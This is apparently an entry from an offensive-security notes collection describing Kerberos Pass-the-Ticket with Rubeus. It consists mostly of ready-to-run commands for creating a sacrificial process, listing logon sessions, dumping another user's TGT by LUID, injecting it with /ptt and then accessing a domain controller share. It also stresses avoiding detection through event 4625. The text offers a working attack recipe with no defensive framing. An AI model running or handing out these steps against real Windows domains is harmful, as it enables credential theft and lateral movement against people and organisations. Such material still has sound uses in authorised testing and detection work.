# 09.10 Pass-the-Ticket

> Steal an existing TGT with `Rubeus dump /luid` and inject via `/ptt` into a `createnetonly` sacrificial process — no password, no event 4625.

## Overview

Pass-the-Ticket steals existing Kerberos tickets from another logon session without touching LSASS passwords. Rubeus triage lists all sessions and tickets with their LUIDs; dump /luid /service:krbtgt extracts a specific TGT; renew /ptt refreshes and injects it into the current session. A sacrificial process (createnetonly) must be used to avoid overwriting existing service tickets. The technique bypasses event 4625 (no password required).

## Steps

- Create a sacrificial process first: Rubeus createnetonly /program:"C:\Windows\System32\cmd.exe" /show; note the LUID.
- Use Rubeus triage to list all sessions, usernames, services, and LUIDs.
- Extract a specific TGT with Rubeus dump /luid:0x89275d /service:krbtgt /nowrap.
- Renew and inject with Rubeus renew /ticket:<base64> /ptt.
- Verify with klist; the ticket appears under the current logon session.
- Access resources normally (e.g. dir \\dc01\\c$); Windows auto-requests TGS tickets from the injected TGT.

## Commands

### Rubeus createnetonly sacrificial process

```powershell
.\Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```

### Rubeus triage list all tickets

```powershell
.\Rubeus.exe triage
```

### Rubeus dump specific TGT by LUID

```powershell
.\Rubeus.exe dump /luid:0x89275d /service:krbtgt /nowrap
```

### Rubeus renew and inject ticket

```powershell
Rubeus.exe renew /ticket:doIFVjCCBVKgAwIBBaEDA<SNIP> /ptt
```
